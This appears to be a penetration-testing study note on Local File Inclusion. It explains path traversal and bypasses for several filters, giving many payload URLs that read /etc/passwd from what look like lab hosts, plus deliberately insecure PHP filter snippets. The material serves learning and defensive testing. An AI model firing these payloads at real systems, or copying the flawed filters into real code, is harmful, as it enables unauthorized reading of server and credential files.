# File Inclusion

These notes summarize core techniques for discovery and exploitation of **file inclusion vulnerabilities**. This is by no means an exhaustive guide. 

---

## Overview

Many server-side languages use HTTP parameters to identify which resources are shown on a web page. If the underlying mechanisms are not securely coded, an attacker can manipulate the parameter values and display any file on the back-end server. This is known as a **Local File Inclusion** (LFI) vulnerability.

---

## Basic LFI

Many applications allow the user to change the language of the content presented. This is often done through a GET parameter that loads the content from some file, such as **en.php** or **es.php**. 

In the most basic of cases, the attacker may simply change the value of the GET parameter to some other file on the server, such as **/etc/passwd**.

**Example:**

```bash
# Original request
http://94.237.49.23:48568/index.php?language=en.php
```

```bash
# LFI
http://94.237.49.23:48568/index.php?language=../../../../etc/passwd
```

![Filtered output](images/basic-lfi.png)

**Path traversal** is commonly used in LFI payloads in order to traverse up the directory-tree and back to the root directory. Traversal stops at the filesystem root, so including additional **../** sequences does not affect the final resolved path.

Sometimes the parameter value is appended after a fixed directory prefix on the server side. Injecting a regular LFI payload may result in an invalid path. By prepending a slash **/** to the payload, the prefix is treated as a directory and the path becomes valid. It's good practice to resort to this technique by default, because even if there is no prefix, the path will still be valid.

**Example:**

```bash
# Prepended slash
http://94.237.49.23:48568/index.php?language=/../../../../etc/passwd
```

---

## Bypassing Filters

Most applications use various filters to protect against LFI attacks. In these scenarios basic LFI payloads will not work.

### Non-recursive Search and Replace Filter

Non-recursive search and replace filters search for instances of ../ and replace them with an empty string in order to avoid path traversals. 

A non-recursive search and replace filter might look like this when implemented in PHP:

```php
$language = str_replace('../', '', $_GET['language']);
```

```bash
# LFI before filter
http://94.237.49.23:48568/index.php?language=../../../../etc/passwd

# LFI after filter
http://94.237.49.23:48568/index.php?language=etc/passwd
```

The above filter is insecure, since it is **non-recursive**. If the filter only performs a single replacement pass, path traversal is still possible.

**Explanation:**

- The payload **....//** contains **../** starting at character 2 
- A single pass removes only one instance of the payload
- The remaining characters still form **../**

**Bypass Examples:**

```bash
# Bypass: ....//
http://94.237.49.23:48568/index.php?language=....//....//....//....//etc/passwd
```

```bash
# Bypass: ..././
http://94.237.49.23:48568/index.php?language=..././..././..././..././etc/passwd
```

```bash
# Bypass (Windows): ....\/
http://94.237.49.23:48568/index.php?language=....\/....\/....\/....\/etc/passwd
```

### Character Blacklist Filter

A character blacklist filter blocks specific characters. LFI-related characters such as dot (**.**) and slash (**/**) are often included in these filters. 

A character blacklist filter may be bypassed by URL encoding the payload. There are many URL encoding tools such as **CyberChef** or **BurpDecoder**.

**Example:**

```bash
# Original
http://94.237.49.23:48568/index.php?language=../../../../etc/passwd
```

```bash
# URL encoded
http://94.237.49.23:48568/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

The above payload may work when input validation is performed before URL decoding, or when decoding is incomplete. In some cases, it is worth double or even triple URL encoding the payload. 

### Approved Paths Filter

Some filters use regular expressions to ensure that any included file is under a specific path. An application may for example only accept included files under the **/languages/**. 

An approved paths filter might look like this when implemented in PHP:

```php
$language = $_GET['language'];

if (strpos($language, 'languages/') === 0) {
    include($language);
} else {
    die('Invalid file path');
}
```

To find the approved path we can examine a legitimate request to see what path is being utilized:

```bash
http://83.136.253.59:34423/index.php?language=languages/en.php
```

![Filtered output](images/approved-path.png)

Approved path filters may be bypassed by prepending the approved path to the payload and then performing directory traversal from that location Approved path filters are often combined with a non-recursive search and replace filter and/or a character blacklist filter. Including recursive payloads and/or URL encoding may be a good idea.

**Examples:**

```bash
# Basic approved path bypass
http://83.136.253.59:34423/index.php?language=languages/../../../../etc/passwd
```

```bash
# Recursive bypasses
http://83.136.253.59:34423/index.php?language=languages/....//....//....//....//etc/passwd

http://83.136.253.59:34423/index.php?language=languages/..././..././..././..././etc/passwd

http://83.136.253.59:34423/index.php?language=languages/....\/....\/....\/....\/etc/passwd
```

```bash
# Recursive and URL encoded bypass
http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64
```